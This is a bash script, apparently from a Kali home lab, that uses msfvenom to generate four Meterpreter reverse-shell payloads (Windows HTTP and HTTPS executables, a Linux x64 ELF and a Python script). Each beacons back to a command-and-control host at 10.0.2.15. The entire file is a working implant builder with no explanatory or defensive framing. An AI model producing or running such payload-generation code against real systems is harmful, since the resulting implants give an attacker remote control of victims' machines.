#!/bin/bash

# Configuration
LHOST="10.0.2.15"
HTTP_PORT="8080"
HTTPS_PORT="8443"
TCP_PORT="4444"
BEACON_INTERVAL=30 # seconds
OUTPUT_DIR="/home/kali/Desktop/c2/msf-c2/payloads"

# Create output directory
mkdir -p $OUTPUT_DIR

echo "[*] Generating C2 Payloads with Periodic Beaconing ($BEACON_INTERVAL s)..."

# 1. Windows Reverse HTTP (Standard Beacon)
echo "[+] Generating Windows HTTP Beacon..."
msfvenom -p windows/meterpreter/reverse_http \
    LHOST=$LHOST LPORT=$HTTP_PORT \
    HttpWait=$BEACON_INTERVAL \
    SessionCommunicationTimeout=10 \
    SessionExpirationTimeout=3600 \
    -f exe -o $OUTPUT_DIR/windows_beacon.exe

# 2. Windows Reverse HTTPS (Encrypted Beacon)
echo "[+] Generating Windows HTTPS Beacon..."
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=$LHOST LPORT=$HTTPS_PORT \
    HttpWait=$BEACON_INTERVAL \
    SessionCommunicationTimeout=10 \
    SessionExpirationTimeout=3600 \
    -f exe -o $OUTPUT_DIR/windows_beacon_https.exe

# 3. Linux Reverse TCP (MX Linux Target)
# Note: TCP doesn't have native "Wait" like HTTP in standard meterpreter, 
# but we set it here for consistency if using custom stagers.
echo "[+] Generating Linux TCP Beacon (MX Linux)..."
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=$TCP_PORT \
    -f elf -o $OUTPUT_DIR/linux_beacon

# 4. Python Multi-Platform Beacon
echo "[+] Generating Python Beacon..."
msfvenom -p python/meterpreter/reverse_http \
    LHOST=$LHOST LPORT=$HTTP_PORT \
    HttpWait=$BEACON_INTERVAL \
    -f raw -o $OUTPUT_DIR/beacon.py

echo "[*] Payload generation complete!"
echo "[*] Payloads saved in: $OUTPUT_DIR"
ls -lh $OUTPUT_DIR
